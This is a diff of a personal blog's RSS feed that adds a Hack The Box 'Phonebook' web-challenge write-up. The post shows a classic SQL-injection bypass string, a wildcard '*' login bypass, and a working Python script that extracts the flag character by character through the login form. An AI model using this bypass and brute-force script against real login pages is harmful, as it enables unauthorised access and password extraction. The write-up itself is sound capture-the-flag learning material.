@@ -21,6 +21,64 @@ While DEFCON is no longer the insane party that you may have heard of in the pas
 <p>And lastly&hellip; book travel and hotel more than 3 weeks in advance, even if it&rsquo;s on my own dime.</p>
 <h1 id="and-in-closing">And in closing&hellip;</h1>
 <p>Don&rsquo;t think about going to DEFCON. If you&rsquo;ve watched a talk, or heard about a village, and it sounds even remotely interesting - <strong>GO TO DEFCON</strong>.</p>
+]]></content></item><item><title>Hack The Box - Phonebook</title><link>https://maclarel.github.io/posts/2022-08/htb_phonebook/</link><pubDate>Mon, 15 Aug 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2022-08/htb_phonebook/</guid><description>Premise Phonebook is a Web challenge from Hack The Box that presents us with a login page for a &amp;ldquo;phonebook&amp;rdquo; system. The goal here is to find a flag hidden somewhere, however it&amp;rsquo;s considerably less obvious than it may seem.
+Exploration When first navigating to the challenge URL you&amp;rsquo;l be greeted with a login prompt to access the phonebook. There don&amp;rsquo;t appear to be any useful links here, however there&amp;rsquo;s a note that the system now supports &amp;ldquo;workstation logins&amp;rdquo; and that post is signed by someone called &amp;ldquo;Reese&amp;rdquo;.</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
+<p>Phonebook is a <code>Web</code> challenge from Hack The Box that presents us with a login page for a &ldquo;phonebook&rdquo; system. The goal here is to find a flag hidden somewhere, however it&rsquo;s considerably less obvious than it may seem.</p>
+<h1 id="exploration">Exploration</h1>
+<p>When first navigating to the challenge URL you&rsquo;l be greeted with a login prompt to access the phonebook. There don&rsquo;t appear to be any useful links here, however there&rsquo;s a note that the system now supports &ldquo;workstation logins&rdquo; and that post is signed by someone called &ldquo;Reese&rdquo;.</p>
+<p>When attempting to map the site with <code>ffuf</code>/<code>dirb</code>, or getting other information from tools like <code>nikto</code> we don&rsquo;t get much back. There&rsquo;s a <code>/search</code> endpoint that appears to be the phonebook in question, but all requests to it just return a <code>403</code> since we&rsquo;re not authenticated.</p>
+<p>My assumption at this point is that there must be some sort of authentication bypass possible. Maybe SQLi?</p>
+<h1 id="see-quell-eye">See Quell Eye</h1>
+<p>Like the skiddie I am, I first started poking at the login form using Burp&rsquo;s <code>Intruder</code> and some SQLi wordlists, but those didn&rsquo;t turn up anything of interest. Long story short, usual/simple auth bypasses like <code>foo' or 1=1; -- </code> got nowhere for either username or password fields.</p>
+<p>This lead to something a bit simpler in my mind&hellip; There&rsquo;s very likely still a database behind this, and the username <em>might</em> be <code>Reese</code> since that&rsquo;s what&rsquo;s noted on the main page. While further injection attacks here didn&rsquo;t seem to get anywhere, a simple <code>*</code> did. Total lack of protection against this. The backend query, effectively, would look something like <code>SELECT username FROM User WHERE username = 'Reese' AND password = *;</code>.</p>
+<h1 id="weve-got-our-bypass">We&rsquo;ve got our bypass</h1>
+<p>This is where this gets fun.</p>
+<p>Despite being authenticated, and getting into the phonebook, the search results are basically useless. There&rsquo;s no flag, a hint of one, or even some of the expected characters (e.g. <code>{</code> or <code>}</code>) that would imply the flag could be extrapolated. Frustrating.</p>
+<p>After poking at search results, a lot, looking for other SQLi opportunities and getting nowhere, I thought maybe the password was our flag? <code>*</code> let us in, maybe we can use that wildcard to our advantage&hellip; Sure enough, we can log in with <code>Reese</code> / <code>H*</code>, or <code>HT*</code>, <code>HTB{*</code>, etc&hellip;</p>
+<h1 id="well-were-not-going-to-_guess_-the-flag">Well we&rsquo;re not going to <em>guess</em> the flag&hellip;</h1>
+<p>This is one of the first <code>Easy</code> rated challenges I&rsquo;ve seen on HTB that really does need you to write a script to be able to effectively solve it. Fortunately, it just needs something simple. In short, we need to iterate through a character list until we get a positive response from the website&rsquo;s login, then move on to enumerate the next character. Good thing there&rsquo;s no rate limiting!</p>
+<p>We can scope the character list to alphanum + <code>_</code> based on what we&rsquo;ve seen with other HTB flags, so at least we have a narrower set than we could have otherwise. Beyond that, we can use <code>requests</code> and iterate to the next potential character whenever we don&rsquo;t get a response URL containing <code>Authentication%20failed</code>.</p>
+<p>The final script would look something like this:</p>
+<pre><code>import requests
+from string import digits, ascii_letters
+
+# Define our target
+url = &quot;http://&lt;challenge_IP&gt;/login&quot;
+
+# Set our char range to test
+# We can't use string.printable as certain chars will trigger an endless loop
+chars = ascii_letters + digits + '_'
+
+# Set the start of our flag string to build on
+flag = 'HTB{'
+
+count = 0
+
+while True:
+
+  # Break if we find the flag
+  if count == len(chars):
+    print(&quot;The flag is: &quot; + flag + '}')
+    break
+
+  # Construct the password char by char
+  password = flag + chars[count] + '*}'
+  print('Testing ' + password)
+
+  # Got our username from the main page of the challenge
+  data = {'username' : 'Reese', 'password' : password}
+  response = requests.post(url, data=data)
+
+  if (response.url != url + &quot;?message=Authentication%20failed&quot;):
+    # This means we got a hit since HTB{&lt;text&gt;*} was accepted
+    flag += chars[count]
+    # Reset counter so we start fresh for next char
+    count = 0
+  else:
+    # Increment counter since tested char wasn't valid
+    count += 1
+</code></pre><p>As soon as we iterate through the entire list of characters once, and get no success, we know that we&rsquo;ve found our flag since it must be the end of the string (or we don&rsquo;t have the right char list).</p>
+<p>GG! Fun to see a challenge on the either end requiring a bit of a more novel approach to solve!</p>
 ]]></content></item><item><title>Management, burnout, and upcoming changes</title><link>https://maclarel.github.io/posts/2022-06/changes/</link><pubDate>Sun, 19 Jun 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2022-06/changes/</guid><description>Management I got into management about a year ago, and it has been one hell of a ride. There&amp;rsquo;s sort of a running joke that &amp;ldquo;management isn&amp;rsquo;t for everyone&amp;rdquo;, and I can certainly verify that.
 I had moved into management with the hopes of it being a great way to advance my career further, push me closer to the goal of getting a Director position, and hopefully scratching the same problem solving itch that solving technical problems and helping organize my team as a lead did.</description><content type="html"><![CDATA[<h1 id="management">Management</h1>
 <p>I got into management about a year ago, and it has been one hell of a ride. There&rsquo;s sort of a running joke that &ldquo;management isn&rsquo;t for everyone&rdquo;, and I can certainly verify that.</p>
